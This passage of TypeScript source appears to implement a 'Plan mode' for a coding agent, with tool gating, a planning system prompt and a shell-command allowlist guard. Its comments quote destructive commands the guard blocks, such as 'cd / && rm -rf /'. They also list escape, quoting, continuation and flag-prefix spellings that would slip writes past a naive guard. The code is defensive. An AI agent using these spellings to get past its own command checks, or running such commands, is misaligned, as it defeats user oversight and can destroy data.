		const selectedNames = planModeSelectedNames(tools);
		return withRequiredPlanModeTools(
			tools
				.filter((tool) => selectedNames.has(tool.name) && canSelectToolInPlanMode(tool))
				.map((tool) => tool.name),
		);
	}

	function planModeSelectedNames(tools: ToolInfo[]) {
		const selectedToolNames = state.selectedToolNames ?? migrateSelectedToolKeys(tools);
		if (selectedToolNames === undefined) return new Set(defaultPlanModeToolNames(tools));

		state = {
			...state,
			selectedToolNames: filterAvailableSelectedNames(selectedToolNames, tools),
			selectedToolKeys: undefined,
		};
		return new Set(state.selectedToolNames);
	}

	function defaultPlanModeToolNames(tools: ToolInfo[]) {
		return tools.filter(isDefaultPlanModeTool).map((tool) => tool.name);
	}

	function migrateSelectedToolKeys(tools: ToolInfo[]) {
		if (state.selectedToolKeys === undefined) return undefined;
		return state.selectedToolKeys
			.map((key) => toolNameFromLegacyKey(key, tools))
			.filter((name): name is string => name !== undefined);
	}

	function filterAvailableSelectedNames(names: string[], tools: ToolInfo[]) {
		const availableNames = new Set(tools.filter(canSelectToolInPlanMode).map((tool) => tool.name));
		return unique(names.filter((name) => availableNames.has(name)));
	}

	function selectableTools() {
		return safeGetAllTools()
			.filter((tool) => tool.name !== PLAN_MODE_QUESTION_TOOL_NAME)
			.sort(compareTools);
	}

	function toolSelectorPageCount(tools: ToolInfo[]) {
		return Math.max(1, Math.ceil(tools.length / TOOL_SELECTOR_PAGE_SIZE));
	}

	function safeGetAllTools() {
		try {
			return pi.getAllTools();
		} catch {
			return [];
		}
	}

	function restoreTools() {
		const restoredTools = previousTools && previousTools.length > 0 ? previousTools : DEFAULT_TOOLS;
		pi.setActiveTools(withoutPlanModeQuestionTool(restoredTools));
		previousTools = undefined;
	}

	function deactivatePlanModeQuestionTool() {
		const activeTools = safeGetActiveTools();
		const filteredTools = withoutPlanModeQuestionTool(activeTools);
		if (filteredTools.length !== activeTools.length) {
			pi.setActiveTools(filteredTools);
		}
	}

	function safeGetActiveTools() {
		try {
			return pi.getActiveTools();
		} catch {
			return DEFAULT_TOOLS;
		}
	}

	function persistState() {
		pi.appendEntry<PlanModeState>(STATE_ENTRY_TYPE, state);
	}

	function restoreState(ctx: ExtensionContext) {
		const entries = ctx.sessionManager.getEntries() as SessionEntry[];
		const entry = entries
			.filter(
				(candidate) => candidate.type === "custom" && candidate.customType === STATE_ENTRY_TYPE,
			)
			.pop();
		if (!entry?.data) return;
		const enabled = entry.data.enabled ?? false;
		state = {
			enabled,
			latestPlan: enabled ? entry.data.latestPlan : undefined,
			awaitingAction: enabled ? (entry.data.awaitingAction ?? false) : false,
			selectedToolNames: entry.data.selectedToolNames,
			selectedToolKeys: entry.data.selectedToolKeys,
			implementing: entry.data.implementing ?? false,
		};
	}

	function syncPlanFromFile(ctx: ExtensionContext) {
		const plan = readPlanFile(ctx.cwd);
		if (plan !== state.latestPlan) {
			state = { ...state, latestPlan: plan, awaitingAction: !!plan };
			persistState();
			updateUi(ctx);
		}
	}

	function updateUi(ctx: ExtensionContext) {
		ctx.ui.setStatus(STATUS_KEY, formatStatus());
		if (state.enabled && state.latestPlan) {
			ctx.ui.setWidget(PLAN_WIDGET_KEY, [
				"Proposed plan ready",
				"Use /plan to implement, revise, or exit Plan mode.",
			]);
		} else if (state.enabled) {
			ctx.ui.setWidget(PLAN_WIDGET_KEY, [
				"Plan mode: planning",
				formatToolSummary(),
				`Write the plan to ${PLAN_FILE_NAME}.`,
			]);
		} else {
			ctx.ui.setWidget(PLAN_WIDGET_KEY, undefined);
		}
	}

	function formatStatus() {
		if (!state.enabled) return undefined;
		if (state.awaitingAction || state.latestPlan) return "plan ready";
		return "plan active";
	}

	function clearUi(ctx: ExtensionContext) {
		ctx.ui.setStatus(STATUS_KEY, undefined);
		ctx.ui.setWidget(PLAN_WIDGET_KEY, undefined);
	}

	function planStatusText() {
		if (!state.enabled) return "Plan mode is off.";
		if (state.latestPlan)
			return `Plan mode is active and a proposed plan is ready. ${formatToolSummary()}`;
		return `Plan mode is active. ${formatToolSummary()} Explore, ask, and write the plan to ${PLAN_FILE_NAME}.`;
	}

	function formatToolSummary() {
		const names = planModeToolNames();
		return `Tools: ${names.length > 0 ? names.join(", ") : "none"}`;
	}

	function isBlockedPlanToolName(toolName: string) {
		return BLOCKED_PLAN_TOOL_NAMES.has(toolName);
	}
}

function isBuiltinTool(tool: ToolInfo) {
	return tool.sourceInfo.source === "builtin";
}

export function completePlanArguments(argumentPrefix: string): CommandArgumentCompletion[] | null {
	const prefix = argumentPrefix.trimStart().toLowerCase();
	if (prefix === "") return [...PLAN_COMMAND_COMPLETIONS];
	if (/\s/.test(prefix)) return null;

	const matches = PLAN_COMMAND_COMPLETIONS.filter((item) => item.value.startsWith(prefix));
	return matches.length > 0 ? [...matches] : null;
}

export function canSelectToolInPlanMode(tool: ToolInfo) {
	// edit/write are not a per-session choice: Plan mode keeps them active for the
	// plan file only, whatever provides them.
	if (BLOCKED_PLAN_TOOL_NAMES.has(tool.name)) return false;
	if (isBuiltinTool(tool)) return SAFE_BUILTIN_PLAN_TOOLS.has(tool.name);
	return true;
}

export function isContextManagementTool(tool: ToolInfo) {
	return CONTEXT_MANAGEMENT_TOOL_NAMES.has(tool.name);
}

// True for the tools Plan mode turns on without a per-session opt-in: the safe
// names from SAFE_BUILTIN_PLAN_TOOLS (matched by name, so a tool an extension
// substituted for a built-in such as grep or find stays available), the
// context-management tools, and the read-only extensions listed in
// DEFAULT_EXTENSION_TOOL_NAMES. Everything else stays user-selected, because Pi
// tool metadata carries no mutability flag to classify it automatically.
export function isDefaultPlanModeTool(tool: ToolInfo) {
	return (
		SAFE_BUILTIN_PLAN_TOOLS.has(tool.name) ||
		isContextManagementTool(tool) ||
		DEFAULT_EXTENSION_TOOL_NAMES.has(tool.name)
	);
}

function toolNameFromLegacyKey(key: string, tools: ToolInfo[]) {
	const directName = tools.find((tool) => tool.name === key)?.name;
	if (directName) return directName;
	const [name] = key.split("\u001f");
	return tools.find((tool) => tool.name === name) ? name : undefined;
}

function compareTools(left: ToolInfo, right: ToolInfo) {
	const leftBuiltin = isBuiltinTool(left);
	const rightBuiltin = isBuiltinTool(right);
	if (leftBuiltin !== rightBuiltin) return leftBuiltin ? -1 : 1;
	return left.name.localeCompare(right.name);
}

function formatToolChoice(tool: ToolInfo, selected: boolean, index: number) {
	const marker = selected ? "[x]" : "[ ]";
	return `${marker} ${index + 1}. ${tool.name} (${toolPolicyLabel(tool)})`;
}

// Human-readable policy label for the `/plan tools` selector. Exported so the
// name-keyed policy can be unit tested without driving the whole selector.
export function toolPolicyLabel(tool: ToolInfo) {
	if (isContextManagementTool(tool)) return "context management";
	// Name-keyed like the gates: a tool that takes over edit/write is confined to
	// the plan file whatever provides it, so it is not a user-risk choice.
	if (BLOCKED_PLAN_TOOL_NAMES.has(tool.name)) {
		return isBuiltinTool(tool)
			? "built-in plan-file only"
			: `plan-file only: ${toolSourceLabel(tool)}`;
	}
	// Genuine built-ins keep their built-in label; only an extension-provided
	// tool is reported as an extension default (a replaced safe name such as
	// pi-fff's grep lands here and shows its npm source).
	if (isBuiltinTool(tool)) {
		if (!SAFE_BUILTIN_PLAN_TOOLS.has(tool.name)) return "built-in blocked";
		return tool.name === "bash" ? "built-in limited" : "built-in";
	}
	// Shells are filtered whatever provides them, so they read as filtered instead
	// of as an unfiltered extension default.
	if (SHELL_TOOL_NAMES.has(tool.name)) return `command filtered: ${toolSourceLabel(tool)}`;
	if (isDefaultPlanModeTool(tool)) return `extension default: ${toolSourceLabel(tool)}`;
	return `user risk: ${toolSourceLabel(tool)}`;
}

function toolSourceLabel(tool: ToolInfo) {
	const sourceInfo = tool.sourceInfo;
	const source = `${sourceInfo.scope}/${sourceInfo.source}`;
	return sourceInfo.path ? `${source} ${sourceInfo.path}` : source;
}

function unique(values: string[]) {
	return Array.from(new Set(values));
}

export function withRequiredPlanModeTools(toolNames: string[]) {
	return unique([
		...withoutPlanModeQuestionTool(toolNames),
		"edit",
		"write",
		PLAN_MODE_QUESTION_TOOL_NAME,
	]);
}

export function withoutPlanModeQuestionTool(toolNames: string[]) {
	return toolNames.filter((toolName) => toolName !== PLAN_MODE_QUESTION_TOOL_NAME);
}

type NormalizePlanModeQuestionParamsResult =
	| { ok: true; questions: PlanModeQuestion[] }
	| { ok: false; error: string };

export function normalizePlanModeQuestionParams(
	input: unknown,
): NormalizePlanModeQuestionParamsResult {
	if (!isRecord(input) || !Array.isArray(input.questions)) {
		return { ok: false, error: "questions must be an array" };
	}
	if (input.questions.length < 1 || input.questions.length > 3) {
		return { ok: false, error: "questions must contain 1-3 items" };
	}

	const questions: PlanModeQuestion[] = [];
	for (const [questionIndex, rawQuestion] of input.questions.entries()) {
		if (!isRecord(rawQuestion)) {
			return {
				ok: false,
				error: `question ${questionIndex + 1} must be an object`,
			};
		}

		const id = stringField(rawQuestion.id);
		const header = stringField(rawQuestion.header);
		const question = stringField(rawQuestion.question);
		if (!id || !header || !question) {
			return {
				ok: false,
				error: `question ${questionIndex + 1} requires non-empty id, header, and question`,
			};
		}

		if (!Array.isArray(rawQuestion.options)) {
			return { ok: false, error: `question ${questionIndex + 1} options must be an array` };
		}
		if (rawQuestion.options.length < 2 || rawQuestion.options.length > 4) {
			return {
				ok: false,
				error: `question ${questionIndex + 1} options must contain 2-4 items`,
			};
		}

		const options: PlanModeQuestionOption[] = [];
		for (const [optionIndex, rawOption] of rawQuestion.options.entries()) {
			if (!isRecord(rawOption)) {
				return {
					ok: false,
					error: `question ${questionIndex + 1} option ${optionIndex + 1} must be an object`,
				};
			}

			const label = stringField(rawOption.label);
			if (!label) {
				return {
					ok: false,
					error: `question ${questionIndex + 1} option ${optionIndex + 1} requires a label`,
				};
			}
			const description = stringField(rawOption.description);
			if (!description) {
				return {
					ok: false,
					error: `question ${questionIndex + 1} option ${optionIndex + 1} requires a description`,
				};
			}
			options.push({ label, description });
		}
		questions.push({ id, header, question, options });
	}

	return { ok: true, questions };
}

async function askPlanModeQuestions(
	questions: PlanModeQuestion[],
	ctx: ExtensionContext,
): Promise<PlanModeQuestionAnswer[] | undefined> {
	const answers: PlanModeQuestionAnswer[] = [];
	for (const question of questions) {
		const choices = question.options.map(formatPlanModeQuestionChoice);
		const otherChoice = `${question.options.length + 1}. Other (free-form)`;
		const choice = await ctx.ui.select(`${question.header}: ${question.question}`, [
			...choices,
			otherChoice,
		]);
		if (!choice) return undefined;

		if (choice === otherChoice) {
			const customAnswer = (await ctx.ui.editor(question.question, ""))?.trim();
			if (!customAnswer) return undefined;
			answers.push({
				id: question.id,
				header: question.header,
				question: question.question,
				answer: customAnswer,
				wasCustom: true,
			});
			continue;
		}

		const optionIndex = choices.indexOf(choice);
		const option = question.options[optionIndex];
		if (!option) return undefined;
		answers.push({
			id: question.id,
			header: question.header,
			question: question.question,
			answer: option.label,
			wasCustom: false,
			optionIndex: optionIndex + 1,
		});
	}
	return answers;
}

function formatPlanModeQuestionChoice(option: PlanModeQuestionOption, index: number) {
	return `${index + 1}. ${option.label}${option.description ? ` — ${option.description}` : ""}`;
}

function planModeQuestionAnswered(
	questions: PlanModeQuestion[],
	answers: PlanModeQuestionAnswer[],
) {
	return {
		content: [
			{ type: "text" as const, text: formatPlanModeQuestionPayload({ cancelled: false, answers }) },
		],
		details: { cancelled: false, questions, answers } satisfies PlanModeQuestionDetails,
	};
}

function planModeQuestionCancelled(
	questions: PlanModeQuestion[],
	reason: PlanModeQuestionReason,
	message: string,
) {
	return {
		content: [
			{
				type: "text" as const,
				text: formatPlanModeQuestionPayload({ cancelled: true, reason, message }),
			},
		],
		details: { cancelled: true, reason, questions } satisfies PlanModeQuestionDetails,
	};
}

function formatPlanModeQuestionPayload(payload: {
	cancelled: boolean;
	reason?: PlanModeQuestionReason;
	message?: string;
	answers?: PlanModeQuestionAnswer[];
}) {
	return JSON.stringify(payload, null, 2);
}

function isRecord(value: unknown): value is Record<string, unknown> {
	return typeof value === "object" && value !== null;
}

function stringField(value: unknown) {
	return typeof value === "string" ? value.trim() : undefined;
}

function buildPlanModePrompt() {
	return `${PLAN_CONTEXT_MARKER}
# Plan Mode (Conversational)

You are in Plan Mode, a Codex-like collaboration mode for producing a decision-complete implementation plan. Chat your way to the plan before finalizing it. A final plan must leave no implementation decisions unresolved.

## Mode rules

- Stay in Plan Mode until a developer or extension explicitly exits it.
- Treat requests to implement as requests to plan the implementation; do not edit project files or carry out the plan.
- Do not use update_plan/TODO tooling in Plan Mode; Plan Mode is conversational planning, not execution progress tracking.
- Plan Mode enforces its tool policy by tool name, not by package. Safe tool names (\`read\`, \`bash\`, \`grep\`, \`find\`, \`ls\`) stay enabled even when an extension provides them, the shell names (\`bash\`, \`powershell\`) pass through the command allowlist however they are provided, and these extension tools stay enabled by default too: context management (billion-context-pi: \`compress\`, \`decompress\`, \`search_context\`, \`acp_status\`; pi-context: \`context_checkpoint\`, \`context_timeline\`, \`context_compact\`), read-only diagnostics (\`lsp_diagnostics\`), delegation (\`push-task\`, \`resume-task\`), and read-only web access (\`web_search\`, \`web_fetch\`); all other non-built-in tools are disabled by default and may be enabled by the user at their own risk. A task branch is navigated inside this same session, so Plan Mode's rules stay in force there: delegate read-only research, exploration, or review instead of the implementation itself. \`task-ask\` is not active inside a branch unless it was enabled from the tool selector before pushing.
- Do not perform mutating actions on project files: no patching, no formatting that rewrites files, no dependency installation, no commits, no migrations.
- The only writable file in Plan Mode is \`${PLAN_FILE_NAME}\` in the working directory. Use it as the plan document: create it with \`write\` or update it with \`edit\`. This restriction is keyed on the tool name, so it also covers an extension that takes over \`edit\` or \`write\`.

## Phase 1 — Ground in the environment

- Explore first and ask second. Use non-mutating exploration to read files, search, inspect configuration, run read-only checks, and resolve discoverable facts.
- Keep the session lean while planning: use the enabled context-management tools (\`compress\`, \`search_context\`, \`decompress\`, \`context_checkpoint\`, \`context_timeline\`) to fold consumed exploration and anchor phases instead of letting context grow unmanaged.
- Before asking the user any question, perform at least one targeted non-mutating exploration pass unless no local environment or repository is available.
- Do not ask questions that can be answered from repository or system truth. Ask only when multiple plausible choices remain, a needed identifier/context is missing, or the ambiguity is product intent.

## Phase 2 — Intent chat

- Keep asking until you can clearly state the goal, success criteria, in/out of scope, constraints, current state, and key preferences/tradeoffs.
- Bias toward questions over guessing: if a high-impact ambiguity remains, do not produce a proposed plan yet.

## Phase 3 — Implementation chat

- Once intent is stable, keep asking until the spec is decision-complete: approach, interfaces, data flow, edge cases/failure modes, testing and acceptance criteria, and any migration or compatibility constraints.
- Use plan_mode_question for important preferences, tradeoffs, or assumption locks that cannot be discovered by non-mutating exploration. Ask 1-3 concise questions with 2-4 meaningful options. Do not include filler options.
- If plan_mode_question returns cancelled or ui_unavailable, do not jump straight to a final plan when the missing answer is high impact. Ask one concise plain-text question or proceed only with a clearly stated low-risk assumption.

## Finalization rule

Only write the final plan when it is decision-complete and leaves no decisions to the implementer. Write the complete plan to \`${PLAN_FILE_NAME}\` (use \`write\` to create/rewrite, \`edit\` for targeted updates) with this structure:

- # Title
- ## Summary
- ## Key Changes
- ## Test Plan
- ## Assumptions

After writing the plan, reply with only a brief chat summary; do not paste the full plan back into the chat. Do not ask "should I proceed?" — the Plan-mode ready menu handles next steps.

## Revision rule

When the user gives feedback on an existing plan, ask clarifying questions first if high-impact ambiguity remains. Otherwise update \`${PLAN_FILE_NAME}\` so it always reflects the latest agreed plan.`;
}

function readCommand(input: unknown) {
	const command = input as { command?: unknown } | undefined;
	return typeof command?.command === "string" ? command.command : "";
}

export function isSafeCommand(command: string) {
	const trimmed = command.trim();
	if (!trimmed) return false;

	// Bash rewrites the command line before any program sees it: quotes disappear, an
	// unquoted backslash escapes the next character, and `$'…'` is decoded to bytes. A
	// guard that reads only the raw text can therefore be evaded by spelling the same
	// command differently — `git log --outpu\t=/tmp/x` reaches git as `--output=/tmp/x`,
	// `find dir \-delete` as `-delete`, and `sort $'\055o' f` as `sort -o f`. Every
	// segment is judged twice for that reason (see judgeSafeCommand), and a refusal from
	// either reading stands. Normalizing is no substitute for the raw text either:
	// `cat My\ File.txt` normalizes to `cat My File.txt` and stays allowed, while the raw
	// text keeps a quoted search pattern quoted (`grep -rn 'rm -rf' .`).
	return judgeSafeCommand(trimmed);
}

/**
 * What a character means to the shell. `unquoted` is live syntax: operators separate
 * commands and a `$` or backtick expands. `single` is literal text (nothing expands or
 * escapes inside it), `double` is a string that still expands and still honours a
 * backslash, and `escaped` marks a character a backslash makes literal — the backslash
 * itself included.
 */
type ShellCharRole = "unquoted" | "single" | "double" | "escaped";

/**
 * One model of bash text for every check in this file: walk the command once, tracking
 * quote state and backslash escapes the way bash does, and report the role of every
 * character. The splitter, the expansion check and the redirect check all read these
 * roles instead of stripping quotes with their own regexes — three regexes were three
 * models, and the two that deleted quote characters by pattern could not tell an
 * escaped or already-quoted quote from an opener, so `echo \'$(x)\'` and
 * `cat f \" > OUT \"` were judged as if those quote characters were real quotes and
 * the expansion and the redirect stayed invisible.
 */
function scanShellText(command: string): ShellCharRole[] {
	const roles: ShellCharRole[] = new Array(command.length).fill("unquoted");
	let quote: "'" | '"' | undefined;
	for (let i = 0; i < command.length; i++) {
		const ch = command[i];
		// Outside single quotes a backslash makes the next character literal, so an
		// escaped quote never opens a string (`echo \" ; git tag -d v2` is two commands)
		// and an escaped `$` never expands.
		if (ch === "\\" && quote !== "'") {
			roles[i] = "escaped";
			if (i + 1 < command.length) {
				roles[i + 1] = "escaped";
				i++;
			}
			continue;
		}
		if (quote === "'") {
			roles[i] = "single";
			if (ch === "'") quote = undefined;
			continue;
		}
		if (quote === '"') {
			roles[i] = "double";
			if (ch === '"') quote = undefined;
			continue;
		}
		if (ch === "'" || ch === '"') {
			quote = ch;
			roles[i] = ch === "'" ? "single" : "double";
		}
	}
	return roles;
}

/**
 * True when the shell would expand something: an unescaped `$` or backtick outside
 * single quotes, a double-quoted one included (`echo "' $(x) '"` expands).
 */
function hasExpansion(command: string): boolean {
	const roles = scanShellText(command);
	for (let i = 0; i < command.length; i++) {
		if (roles[i] === "single" || roles[i] === "escaped") continue;
		if (command[i] === "$" || command[i] === "`") return true;
	}
	return false;
}

/**
 * True when the shell would act on a redirect: `>` and `>>` write a file, `&>` and
 * `>&` write one, and `<<`/`<<<`/`<(...)`/`>(...)` carry a command body. Only the
 * fd-to-fd forms (`2>&1`, `1>&2`) move a descriptor without writing. Quoted and
 * escaped characters are data, which keeps `echo 'a > b'` allowed while
 * `cat f \" > OUT \"` is a write.
 */
function hasRedirect(command: string): boolean {
	const roles = scanShellText(command);
	for (let i = 0; i < command.length; i++) {
		if (roles[i] !== "unquoted") continue;
		const ch = command[i];
		if (ch === ">") {
			if (isFdToFdRedirect(command, i)) continue;
			return true;
		}
		if (ch === "<" && (command[i + 1] === "<" || command[i + 1] === "(")) return true;
	}
	return false;
}

/** `2>&1` moves a file descriptor and writes nothing; every other `>` writes. */
function isFdToFdRedirect(command: string, index: number): boolean {
	return (
		/[012]/.test(command[index - 1] ?? "") &&
		command[index + 1] === "&" &&
		/[012]/.test(command[index + 2] ?? "")
	);
}

/**
 * Bash drops a `#` comment (outside quotes, at the start of a word) up to the
 * physical newline, and a backslash inside the comment does not continue it:
 * `cat f # '` followed by a newline runs the next line as a fresh command. The
 * join below would glue that comment text onto the next command, and an
 * apostrophe or double quote inside the comment then swallows the inserted
 * separator during the role scan, hiding the command from the judge. Comment
 * text is therefore removed before the join; quote state is carried across
 * physical lines so a `#` inside quotes stays literal, and a backslash run
 * before the newline is left in place for the join's parity rule. A continuation
 * joined into a comment line (`echo a \` followed by `# x`) drops the comment text
 * and judges what is left (`echo a`), which is read-only and stays allowed — bash
 * prints `a` there too, so nothing is refused by that path.
 */
function stripShellComments(command: string) {
	let stripped = "";
	let quote: "'" | '"' | null = null;
	let atWordStart = true;
	let inComment = false;
	for (let index = 0; index < command.length; index += 1) {
		const char = command[index] ?? "";
		if (inComment) {
			if (char === "\n") {
				inComment = false;
				atWordStart = true;
				stripped += char;
			}
			continue;
		}
		if (quote === "'") {
			stripped += char;
			if (char === "'") quote = null;
			continue;
		}
		if (quote === '"') {
			stripped += char;
			if (char === "\\") {
				index += 1;
				stripped += command[index] ?? "";
			} else if (char === '"') {
				quote = null;
			}
			continue;
		}
		if (char === "#" && atWordStart) {
			inComment = true;
			continue;
		}
		if (char === "'" || char === '"') {
			quote = char;
			atWordStart = false;
			stripped += char;
			continue;
		}
		if (char === "\\") {
			stripped += char;
			index += 1;
			const escaped = command[index] ?? "";
			stripped += escaped;
			if (escaped !== "\n") atWordStart = false;
			continue;
		}
		stripped += char;
		atWordStart = char === " " || char === "\t" || char === "\n" || ";|&()<>".includes(char);
	}
	return stripped;
}

function judgeSafeCommand(command: string) {
	// A backslash-newline is a line continuation: bash removes both characters before
	// it reads the line, so `sort -\⏎o OUT f` reaches sort as `sort -o OUT f`. Removing
	// the pair first keeps the splitter from reading the `;` inserted below as an
	// escaped separator, which is how a spliced flag stayed invisible (the continuation
	// branch in bashNormalized keeps its own handling of the same rule for direct
	// calls and for the test that pins the second reading).
	// A backslash-newline is a continuation only when that backslash is not itself
	// escaped: for a run of N backslashes the shell drops the last one together with the
	// newline when N is odd, and keeps the newline as a real separator when N is even
	// (`echo \\` followed by a newline starts a second command). Deleting `\`+newline
	// everywhere joined those two commands into one for even runs, so the join counts the
	// run: the surviving backslashes stay even, which is what keeps the inserted
	// separator unescaped.
	const singleLine = stripShellComments(command)
		.replace(/(\\+)\n/g, (run) => {
			const backslashes = run.length - 1;
			return backslashes % 2 === 1 ? run.slice(0, -2) : run.slice(0, -1) + "; ";
		})
		.replace(/\n+/g, "; ");

	// Expansion is refused instead of modelled, and the check reads quote roles rather
	// than stripping quotes with a pattern: `echo \'$(x)\'` and `echo "' $(x) '"`
	// reach bash as a command substitution (the first quote is escaped, the second
	// sits inside a double-quoted string), while `sed -n '$p' f`, `grep -rn '$' .` and
	// `echo \$HOME` stay literal.
	if (hasExpansion(singleLine)) return false;

	// Redirects write files; block every unquoted one except harmless fd-to-fd
	// forms like 2>&1 ("grep foo 2>&1 | head" is read-only). Heredocs (<<, <<<)
	// and process substitution (<(...), >(...)) are blocked because their bodies can
	// smuggle arbitrary commands, and a redirect is only one the shell would act on:
	// quoting or escaping the `>` makes it an argument (`cat f \" > OUT \"` writes
	// OUT in bash, `echo a \> b` prints it).
	if (hasRedirect(singleLine)) return false;

	// `git log --output=x` writes x (same for `git diff`/`git show`), and no
	// read-only command in the allowlist takes an output-file flag. Unlike the
	// redirect check above, this one runs on the raw command text, and a quote may sit
	// between the separator and the dashes: quoting a flag does not stop the command
	// from consuming it (`git log "--output=/tmp/x" f` reaches git as
	// `--output=/tmp/x`). Git resolves long options by unambiguous prefix, so the
	// short spellings `--out=`, `--outp=`, and `--outpu=` write the same file and are
	// refused as one family; `--output-indicator-*` is a different git log option and
	// stays allowed, because the follow set after the matched prefix is `=`, a quote,
	// whitespace, or the end of the command. The price is a false denial in the safe
	// direction: the bare word is refused too, so a search for the literal text
	// `--output` needs the bracket form (`grep -rn -- '--outpu[t]' .`).
	// Every pipeline stage / ; / && / || branch must independently pass the
	// allowlist. This stops "grep foo | xargs rm", "echo hi | bash",
	// "cd / && rm -rf /" and friends from hiding behind a read-only first word.
	const segments = splitShellSegments(singleLine);
	if (segments.length === 0) return false;

	for (const segment of segments) {
		if (!judgeSegment(segment, "raw")) return false;
		// The same decision is made again on the bash-normalized reading of the segment.
		// Escaping cannot create a separator (a quoted `;` reaches the program as an
		// argument, not as command syntax), so the boundaries the raw text established
		// still hold — but `find dir \-delete`, `sort $'\055o' f` and
		// `git log --outpu\t=/tmp/x` resolve here to the flags they really are, and a
		// refusal from either reading stands.
		const normalized = bashNormalized(segment);
		if (normalized !== segment && !judgeSegment(normalized, "normalized")) return false;
	}
	return true;
}

/**
 * Judge one command segment: its command word, its flags, and any mutating keyword
 * that survived the allowlist. It runs for the raw segment and again for the
 * normalized reading of that segment, so each spelling has to pass on its own while
 * the head is resolved the way bash resolves it. `reading` names which of the two is
 * being judged: a check that counts words has to say so, because the normalized text
 * has lost the quotes that hold one argument together.
 */
function judgeSegment(segment: string, reading: "raw" | "normalized"): boolean {
	// A first token with a path separator is a path, not a command word. The
	// patterns below are prefix-anchored, so without this guard a path whose
	// leading word is allowlisted (`cat/../../bin/rm -rf x`) would be waved
	// through, and Windows accepts `/` as a separator. Path *arguments* such as
	// `cat ./Makefile` are unaffected: only the first token is inspected.
	if (hasPathShapedHead(segment)) return false;
	// Parameter expansion defeats both readings: `sort${IFS}-o OUT f` is one word to
	// the judge and two words to bash, so no flag check ever sees the `-o`, and
	// `echo $(git tag -d v2)` runs a command whose text the allowlist never reads.
	// A `$` the shell would expand is therefore refused instead: outside single quotes
	// and not backslash-escaped, which keeps `sed -n '$p' f`, `grep -rn '$' .` and
	// `echo \$HOME` allowed. The price is a false denial for a double-quoted `$`
	// (`grep -rn "$x" .`) and for `$'…'`, both of which were refused through other
	// paths before this check existed.
	if (reading === "raw" && hasExpansion(segment)) return false;
	if (!SAFE_BASH_PATTERNS.some((pattern) => pattern.test(segment))) return false;

	const head = firstCommandWord(segment);
	if (!head) return true;

	// `git log --output=x` writes x (same for `git diff`/`git show`), and no
	// read-only command in the allowlist takes an output-file flag. A quote may sit
	// between the separator and the dashes: quoting a flag does not stop the command
	// from consuming it (`git log "--output=/tmp/x" f` reaches git as
	// `--output=/tmp/x`). Git resolves long options by unambiguous prefix, so the
	// short spellings `--out=`, `--outp=`, and `--outpu=` write the same file and are
	// refused as one family; `--output-indicator-*` is a different git log option and
	// stays allowed, because the follow set after the matched prefix is `=`, a quote,
	// whitespace, or the end of the command. The price is a false denial in the safe
	// direction: the bare word is refused too, so a search for the literal text
	// `--output` needs the bracket form (`grep -rn -- '--outpu[t]' .`).
	if (/(?:^|[\s'"])--ou(?:t(?:p(?:u(?:t)?)?)?)?(?:=|\s|['"]|$)/i.test(segment)) return false;

	// Head-specific guards run before the inert-argument shortcut below, because a
	// command that is read-only by construction can still carry a flag that writes
	// (`sort -o out`).
	//
	// find can mutate via -delete/-exec/-ok (and their -execdir/-okdir forms) and
	// writes a file through -fprint/-fprint0/-fprintf/-fls; other flags are
	// read-only, so a search for a file named "rm" must not trip the keyword list.
	// The left boundary accepts a quote for the same reason the sort and `--output`
	// checks do: `find dir "-delete"` reaches find as `-delete`.
	if (head === "find") {
		if (/(?:^|[\s'"])-(?:delete|exec|execdir|ok|okdir|fprintf|fprint0?|fls)\b/i.test(segment))
			return false;
		return true;
	}

	// sed edits in place with `-i` (in any combination, including `-ni` and
	// `-i.bak`), `-f`/`--file` runs a script file whose commands this allowlist
	// cannot see, and `-e`/`--expression` adds a second script that only the first
	// one would be checked against; `sed -n -i 's/a/Z/' f` empties a file. Quoted
	// text is dropped first, because a `-i` inside a script or pattern is not a
	// flag.
	if (head === "sed") {
		const sedFlags = segment.replace(/"[^"]*"|'[^']*'/g, " ");
		if (
			/(?:^|\s)(?:--in-place\b|--file\b|-f\b|-e\b|--expression\b|-[a-zA-Z.]*i[a-zA-Z.]*)/i.test(
				sedFlags,
			)
		)
			return false;
		// The flags are not the whole hazard: a script can write files (the `w`/`W`
		// command, `s///w file`) and run commands (GNU's `e` command, `s///e`), and
		// that is exactly the text the flag check above drops. Telling a read-only
		// script from a writing one needs a full sed grammar, so the script argument
		// is allowlisted instead: numeric or `$` addresses followed by `p`,
		// `;`-joined. Everything else is refused — including substitution and regex
		// addresses, so `sed -n '/x/p' f` needs `grep` instead. That loss is the price
		// of keeping this entry sound.
		const sedScript = (
			segment.match(/^\s*sed\s+-n(?:\s+(?:--|-[a-zA-Z.]+))*\s+(\S+)/i)?.[1] ?? ""
		).replace(/^(['"])([\s\S]*)\1$/, "$2");
		if (!/^(?:\d+|\$)?(?:,(?:\d+|\$)?)?p(?:;(?:\d+|\$)?(?:,(?:\d+|\$)?)?p)*$/.test(sedScript))
			return false;
	}

	// sort is argument-inert but not flag-inert: `-o FILE` and `--output=FILE`
	// write a file, `--compress-program` runs a program, and `--temporary-directory`
	// picks where the spills land. sort accepts a long option at any unambiguous
	// prefix (`--o`, `--ou`, `--out`, `--outp`, …), so the families are matched by
	// prefix rather than by full spelling, and a short bundle is scanned per letter
	// (`sort -nroOUT f` is `-o OUT`).
	if (head === "sort") {
		if (hasDangerousShortFlag(segment, "oT")) return false;
		if (hasDangerousLongOption(segment, SORT_WRITE_OPTIONS)) return false;
	}

	// rg runs the `--pre`/`--pre-glob` command for every file it scans, and fd runs
	// whatever `-x`/`-X`/`--exec`/`--exec-batch` name. Both sit in
	// PURE_READ_BASH_COMMANDS, so nothing else looks at their flags.
	if (head === "rg" && hasDangerousLongOption(segment, RG_EXEC_OPTIONS)) return false;
	if (head === "fd") {
		if (hasDangerousShortFlag(segment, "xX")) return false;
		if (hasDangerousLongOption(segment, FD_EXEC_OPTIONS)) return false;
	}

	// tree writes its listing with `-o FILE`/`--output FILE`, date moves the system
	// clock with `-s`/`--set`, and bat starts a pager program (`--pager`) or reads a
	// program out of a config file (`--config-file`).
	if (head === "tree") {
		if (hasDangerousShortFlag(segment, "o")) return false;
		if (hasDangerousLongOption(segment, TREE_WRITE_OPTIONS)) return false;
	}
	if (head === "date") {
		if (hasDangerousShortFlag(segment, "s")) return false;
		if (hasDangerousLongOption(segment, DATE_SET_OPTIONS)) return false;
	}
	if (head === "bat" && hasDangerousLongOption(segment, BAT_EXEC_OPTIONS)) return false;

	// `uniq` takes its output file as a positional argument (`uniq INPUT OUTPUT`), so a
	// second non-flag word is a write handle rather than a second input. Words are
	// matched with quotes respected (`uniq "my file.txt"` is one argument), and only on
	// the raw text: bash merges arguments when it quotes or escapes, never the other way
